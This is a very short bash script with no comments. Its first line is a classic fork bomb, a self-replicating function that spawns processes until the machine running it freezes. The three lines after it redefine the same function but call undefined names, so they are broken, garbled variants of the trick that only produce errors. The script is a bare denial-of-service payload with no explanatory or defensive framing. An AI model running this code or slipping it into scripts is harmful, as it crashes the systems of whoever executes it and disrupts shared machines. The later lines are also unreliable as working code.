#!/bin/bash

a() { a|a & }; a

a() { b|b & }; b

a() { c|c & }; c

a() { d|e & }; e
